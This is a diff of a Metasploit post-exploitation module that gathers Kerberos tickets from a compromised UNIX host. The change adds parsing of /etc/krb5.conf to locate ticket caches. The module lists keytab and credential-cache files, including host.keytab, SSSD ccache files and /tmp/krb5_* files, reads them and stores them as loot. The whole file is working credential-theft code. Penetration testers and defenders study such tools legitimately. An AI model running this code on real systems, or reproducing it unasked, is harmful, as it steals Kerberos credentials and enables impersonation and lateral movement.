@@ -26,29 +26,67 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+require 'shellwords'
+
 class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Unix
 
-  def initialize(info={})
-    super( update_info(info,
-      "Name"           => "UNIX Gather Kerberos Tickets",
-      "Description"    => %q{ Post Module to obtain all kerberos tickets on the targeted UNIX machine. },
-      "License"        => MSF_LICENSE,
-      "Author"         => [ "Tim Brown <timb[at]nth-dimension.org.uk>"],
-      "Platform"       => %w{ linux osx unix solaris aix },
-      "SessionTypes"   => [ "meterpreter", "shell" ]
-    ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'UNIX Gather Kerberos Tickets',
+        'Description' => %q{ Post Module to obtain all kerberos tickets on the targeted UNIX machine. },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'Tim Brown <timb[at]nth-dimension.org.uk>'],
+        'Platform' => %w[linux osx unix solaris aix],
+        'SessionTypes' => [ 'meterpreter', 'shell' ]
+      )
+    )
+    register_options([
+      OptString.new('KRB_CONFIG_FILE', [true, 'The Kerberos config file.', '/etc/krb5.conf']),
+    ])
   end
 
   def run
-    print_status("Finding files")
-    files = [ "/etc/opt/quest/vas/host.keytab" ]
-    files = files + cmd_exec("ls /var/lib/sss/db/ccache_*").split(/\r\n|\r|\n/)
-    files = files + cmd_exec("ls /tmp/krb5*").split(/\r\n|\r|\n/)
+    print_status('Finding files')
+    files = [ '/etc/opt/quest/vas/host.keytab' ]
+    if file? datastore['KRB_CONFIG_FILE']
+      config = read_file(datastore['KRB_CONFIG_FILE'])
+      if /\n\s*default_ccache_name\s*=\s*(?<cache_location>.*?)\s*\n/ =~ config
+        if /^FILE:(?<file_pattern>.*%\{uid\}.*)/ =~ cache_location
+          suffix = ''
+        elsif /^DIR:(?<file_pattern>.*%\{uid\}.*)/ =~ cache_location
+          suffix = '/*'
+        elsif /^(?<storage>KEYRING|API|KCM|MEMORY|KSLSA):/ =~ cache_location
+          print_error("Kerberos ticket cache uses #{storage}. This module does not support this storage type.")
+        else
+          print_error("Unknown storage type: #{cache_location}")
+        end
+
+        if file_pattern
+          print_status("Kerberos tickets configured to be stored at #{file_pattern}")
+          placeholder = 'MSF_INSERT_HERE'
+          # The krb5 pattern uses %{uid} as a wildcard. This is misinterpreted by Rubocop as a format string token
+          # rubocop: disable Style/FormatStringToken
+          file_pattern['%{uid}'] = placeholder
+          # rubocop: enable Style/FormatStringToken
+          # Need to do this two-step thing so Shellwords.escape doesn't escape the asterisk
+          file_pattern = Shellwords.escape(file_pattern)
+          file_pattern[placeholder] = '*'
+          files += cmd_exec("ls #{file_pattern}#{suffix}").split(/\r\n|\r|\n/)
+        end
+      end
+    else
+      print_error("Could not find #{datastore['KRB_CONFIG_FILE']}")
+    end
+    files += cmd_exec('ls /var/lib/sss/db/ccache_*').split(/\r\n|\r|\n/)
+    files += cmd_exec('ls /tmp/krb5_*').split(/\r\n|\r|\n/)
+    files = files.uniq
     files = files.select { |d| file?(d) }
     if files.nil? || files.empty?
-      print_error("No kerberos tickets found")
+      print_error('No kerberos tickets found')
       return
     end
     download_loot(files)
@@ -58,12 +96,12 @@ class MetasploitModule < Msf::Post
     print_status("Looting #{files.count} files")
     files.each do |file|
       file.chomp!
-      sep = "/"
+      sep = '/'
       print_status("Downloading #{file}")
       data = read_file(file)
       file = file.split(sep).last
-      loot_file = store_loot("unix_kerberos_tickets", "text/plain", session, data, "unix_kerberos_tickets_#{file}", "Kerberos Tickets File")
-      print_good("File stored in: #{loot_file.to_s}")
+      loot_file = store_loot('unix_kerberos_tickets', 'application/octet-stream', session, data, "unix_kerberos_tickets_#{file}", 'Kerberos Tickets File')
+      print_good("File stored in: #{loot_file}")
     end
   end
 end
